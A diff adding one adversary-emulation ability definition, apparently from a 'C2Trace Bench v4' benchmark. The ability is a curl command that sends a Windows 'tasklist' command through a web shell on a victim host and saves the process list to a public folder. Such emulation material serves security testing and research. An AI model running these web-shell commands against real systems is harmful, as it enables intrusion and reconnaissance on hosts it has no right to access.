@@ -1,0 +1,15 @@
+- id: 87bd9d84-f8b7-5810-9a53-ce0a9cdb589d
+  name: CTID WebShell process discovery [MEP-WINDOWS-WEBSHELL-01]
+  description: C2Trace Bench v4 frozen ability.
+  tactic: discovery
+  technique:
+    attack_id: T1057
+    name: Process Discovery
+  repeatable: false
+  platforms:
+    linux:
+      sh:
+        command: response=$(curl --fail --silent --show-error --max-time 20 -X POST --form-string 'c=cmd.exe /d /c "tasklist
+          > C:/Users/Public/#{c2trace.target_name}.tasks.txt"' "http://#{c2trace.victim_ip}:#{c2trace.webshell_port}") ||
+          exit $?; printf '%s\n' "$response"; printf '%s' "$response" | python3 -c 'import json,sys; d=json.load(sys.stdin);
+          bad=any(str(d.get(k) or "").strip() for k in ("Error","ErrorString")); sys.exit(1 if bad else 0)'
